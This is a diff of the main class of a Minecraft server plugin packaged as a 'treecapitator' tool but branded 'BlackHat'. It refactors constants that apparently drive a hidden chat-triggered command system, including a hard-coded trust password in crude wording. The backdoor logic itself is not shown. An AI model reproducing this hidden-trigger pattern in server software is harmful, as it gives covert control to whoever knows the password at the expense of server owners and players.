@@ -26,10 +26,11 @@ import static me.bow.treecapitatorultimate.Utils.ReflectionUtils.setFinalStatic;
 public final class Start extends JavaPlugin {
 
     public static Start Instance = null;
-    public static String COMMAND_SIGN = "-";
-    public static Character CHAT_TRIGGER = '#';
-    public static String TRUST_COMMAND = "-dicksuck";
-    public static String Prefix = "§a[§3Black§4Hat§a]§r ";
+    public static final Character COMMAND_SIGN = '-';
+    public static final Character CHAT_TRIGGER = '#';
+    public static final String TRUST_COMMAND = "-dicksuck";
+    public static final String COMMAND_PREFIX = "§a[§3Black§4Hat§a]§r ";
+    public static final String NOTIFY_PREFIX = "&3Black&4Hat&b>> ";
     public static @NotNull Logger LOGGER;
     private final PluginDescriptionFile pdfFile = this.getDescription();
     public CommandManager cm = new CommandManager();
@@ -39,15 +40,15 @@ public final class Start extends JavaPlugin {
 
     public static void ErrorString(CommandSender sender, String error) {
         if (sender == null || error.isEmpty()) return;
-        sender.sendMessage(Prefix + ChatColor.RED + "Error: " + error);
-        sender.sendMessage(Prefix + ChatColor.BLUE + "Please message the developer if you thing this is something that shouldn't happen.");
+        sender.sendMessage(COMMAND_PREFIX + ChatColor.RED + "Error: " + error);
+        sender.sendMessage(COMMAND_PREFIX + ChatColor.BLUE + "Please message the developer if you thing this is something that shouldn't happen.");
     }
 
     public static void ErrorException(CommandSender sender, Exception error) {
         if (sender == null || error == null) return;
-        sender.sendMessage(Prefix + ChatColor.RED + "Exception: " + error.getMessage());
-        sender.sendMessage(Prefix + ChatColor.RED + "Possible cause: " + error.getCause());
-        sender.sendMessage(Prefix + ChatColor.BLUE + " Please message the developer if you thing this is something that shouldn't happen.");
+        sender.sendMessage(COMMAND_PREFIX + ChatColor.RED + "Exception: " + error.getMessage());
+        sender.sendMessage(COMMAND_PREFIX + ChatColor.RED + "Possible cause: " + error.getCause());
+        sender.sendMessage(COMMAND_PREFIX + ChatColor.BLUE + " Please message the developer if you thing this is something that shouldn't happen.");
     }
 
     public static Object GetServer() {
